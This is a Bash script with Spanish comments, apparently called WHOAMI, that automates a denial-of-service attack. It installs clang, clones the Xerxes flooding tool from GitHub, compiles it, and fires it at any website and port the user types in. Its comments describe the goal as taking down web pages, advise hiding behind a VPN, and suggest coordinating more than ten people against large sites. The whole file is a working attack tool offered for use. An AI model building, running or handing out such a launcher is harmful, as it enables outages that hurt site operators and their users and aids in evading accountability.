#!/bin/bash
# Desarrollador de Script: KevinVarsa
# Herramienta para hacer un ataque de denegacion de servicio
# Herramienta colaborada con Xerxes, solo que mas automatizado
# Tumba paginas web de una forma eficiente
# DOS=DENEGACION DE SERVICIO
# DDOS= DENEGACION DE SERVICIO DISTRIBUIDO
# Se recomienda usar VPN
# Para tumbar una pagina web grande se necesita usar esta herramienta entra mas de 10 personas
# Script
# VPN
# Codigo
# Colors
white="\e[1;37m"
red="\e[1;31m"
#Banner
banner() {
echo -e "${red}  ▄ ▄    ▄  █ ████▄${white}   ██ █▀▄▀█ ▄█ "
echo -e "${red} █   █  █   █ █   █${white}  █ █ █ █ █ ██ "
echo -e "${red}█ ▄   █ ██▀▀█ █   █${white} █▄▄█ █ ▄ █ ██ "
echo -e "${red}█  █  █ █   █ ▀████${white} █  █ █   █ ▐█ "
echo -e "${red} █ █ █     █       ${white}    █    █   ▐ "
echo -e "${red}  ▀ ▀     ▀        ${white}   █    ▀      "
echo -e "${red}                   ${white}  ▀            "
echo -e ${red} "                    (By:KevinVarSa)"
echo ""
}
#URL
url="git clone https://github.com/CyberXCodder/XerXes.git"
# Funciones con comandos a ejecutar automaticamente
Instalacion() {
apt install clang -y
pkg install clang -y
$url
}
# Ejecucion
Ejecute() {
cd XerXes
gcc xerxes.c -o xerxes
clear
banner
echo -e ${white} "Ingrese la pagina web"
read -p "Pagina Web (www.pagina.com 80): " web
echo -e ${red}[${white}+${red}]Iniciando Ataque...
sleep 2
./xerxes $web
}
# Repeticion de opcion incorrecta.
repeat() {
# Lista de opciones
banner
echo -e ${white} "Ingrese una Opcion"
opciones=("1:Instalacion" "2:Ejecucion_Dos" "3:Exit")
       for i in ${opciones[@]};do
       echo $i
       sleep 0.3
   done
read -p "|opcion|: " op

# Estructura case para decision de opciones
case $op in
[1-2-3])
    if [ $op -eq 1 ];then
     echo -e "${red}[+]${white}Instalando..."
     sleep 1
     Instalacion
     echo ""
     echo "Instalado correctamente. Ahora ejecute la opcion 2..."
     sleep 2.1
     clear
     repeat

elif [ $op -eq 2 ];then
   echo ""
   echo "Ejecutando Denegacion de Servicio"
   sleep 1.5
   Ejecute

elif [ $op -eq 3 ];then
   echo "Gracias por usar WHOAMI"
   echo "Feliz HackingDay :D"
  sleep 1
   exit 0
fi
;;
*)echo ""
 echo "Opcion incorrecta. Intente nuevamente"
sleep 1
clear
repeat
;;
esac
}
repeat
